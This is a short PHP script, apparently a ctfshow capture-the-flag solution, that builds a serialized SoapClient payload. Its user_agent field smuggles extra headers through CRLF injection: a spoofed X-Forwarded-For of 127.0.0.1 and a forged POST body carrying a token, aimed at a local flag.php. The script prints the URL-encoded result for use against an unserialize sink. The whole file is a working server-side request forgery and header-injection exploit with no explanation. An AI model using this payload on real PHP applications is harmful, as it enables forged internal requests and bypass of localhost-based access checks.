<?php
//SoapClient的利用
<?php

$post_string = 'token=ctfshow';

$soap = new SoapClient(
    null,
    array(
        'uri'=> "http://127.0.0.1/flag.php",
        'location' => 'http://127.0.0.1/flag.php',
        'user_agent'=>"edge\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded"."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
        // 'user_agent'=>"edge\x0D\x0AX-Forwarded-For:127.0.0.1,127.0.0.1\x0D\x0AContent-Type: application/x-www-form-urlencoded"."\x0D\x0AContent-Length: ".(string)strlen($post_string)."\x0D\x0A\x0D\x0A".$post_string,
    )
);

echo(urlencode(serialize($soap)));

?>